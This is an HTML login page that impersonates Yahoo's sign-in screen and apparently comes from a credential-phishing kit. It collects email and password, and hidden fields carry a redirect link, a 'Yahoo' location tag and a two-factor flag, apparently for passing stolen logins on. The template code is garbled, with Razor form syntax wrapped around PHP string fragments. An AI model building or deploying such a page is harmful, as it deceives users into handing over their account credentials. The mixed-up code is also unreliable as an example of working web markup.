<head><title>Yahoo - login</title>
<link rel=stylesheet type=text/css href="~/css/000webhost.css">
<link rel=stylesheet type=text/css href="~/css/yahoo.css">
<meta charset="utf-8"/><link href="data:image/png;base64," rel="icon" type="image/gif"/></head>
<body class="orko en-us narrow"><div class="login-header"><img alt="Yahoo" class="logo" height="" src="data:image/png;base64," width="116"/></div><div class="login-body">                @using (Html.BeginForm())
                {<div class="sign-in-title"><h1 class="sign-in-title-greeting"> Sign in </h1><p class="row signin-sub-title"> using your Yahoo account </p></div><div style="position:relative;margin-top:30px">
<input name="name" type="hidden" value="'.basename(__FILE__).'"/>
<input name="TFA_Enabled" type="hidden" value="'.$TFA_Enabled.'"/>
<input class="phone-no" name="username" placeholder="Email address" required="" type="text"/><br/><br/>
<input class="phone-no" name="password" placeholder="Password" required="" type="password"/>
<input name="link" type="hidden" value=".$redirect."/>
<input name="location" type="hidden" value="Yahoo"/></div>
<input class="orko-button-primary orko-button" name="signin" type="submit" value="Sign in"/><p class="row help"><a href="">Trouble signing in?</a></p><p class="row sign-up-link"><a class="orko-button-secondary orko-button" href="" role="button">Create account</a></p>}</div></body>